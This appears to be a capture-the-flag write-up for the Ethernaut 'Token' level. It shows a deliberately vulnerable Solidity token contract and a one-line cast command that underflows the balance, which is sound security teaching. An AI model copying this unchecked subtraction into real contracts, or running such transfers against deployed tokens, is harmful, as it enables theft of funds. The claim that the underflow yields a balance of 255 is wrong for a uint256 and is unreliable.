## Fallback Level Outline

**Difficulty : 3/10**

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

## Solution

To pass this level, we need to send a transaction to cause an underflow resulting in a balance of 255.

### Walkthrough
1. underflowing our balance
```console
cast send $LEVEL_ADDRESS "transfer(address _to, uint _value)" $LEVEL_ADDRESS 21 --private-key $PRIVATE_KEY
```

## Further Reading
Integer overflows and underflows can be prevented by using OpenZeppelin's [SafeMath library](https://docs.openzeppelin.com/contracts/2.x/api/math)
